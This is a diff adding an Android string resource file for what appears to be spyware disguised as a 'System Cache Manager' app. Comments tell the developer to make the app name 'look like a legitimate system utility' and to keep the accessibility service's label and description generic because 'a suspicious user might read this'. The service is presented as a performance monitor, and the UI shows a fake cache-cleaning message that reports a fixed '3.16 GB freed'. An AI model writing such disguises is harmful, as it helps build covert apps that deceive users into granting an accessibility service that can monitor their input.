@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- ── App Identity (what the OS and launcher show) ───────────────────── -->
+    <!--
+        This is the string the OS displays:
+          - In the app launcher
+          - In recent apps list
+          - In Settings → Apps
+
+        It must look like a legitimate system utility.
+    -->
+    <string name="app_name">System Cache Manager</string>
+    <string name="app_name_stealth">System Cache Manager</string>
+
+    <!-- ── Accessibility Service Strings ─────────────────────────────────── -->
+    <!--
+        These strings appear in Settings → Accessibility → [App Name].
+        A suspicious user might read this, so keep it generic.
+    -->
+    <string name="accessibility_service_label">System Input Monitor</string>
+    <string name="accessibility_service_description">
+        Monitors system input events to optimize performance and
+        enable quick-access shortcuts for device management features.
+    </string>
+
+    <!-- ── UI Strings ────────────────────────────────────────────────────── -->
+    <string name="btn_scan">Scan</string>
+    <string name="btn_clear">Clear Cache</string>
+    <string name="toast_cleared">Cache Cleared. 3.16 GB freed.</string>
+    <string name="tv_status_default">Tap Scan to analyse storage</string>
+
+    <!-- ── Content Descriptions (accessibility — keep generic) ───────────── -->
+    <string name="cd_storage_progress">Storage usage indicator</string>
+
+</resources>
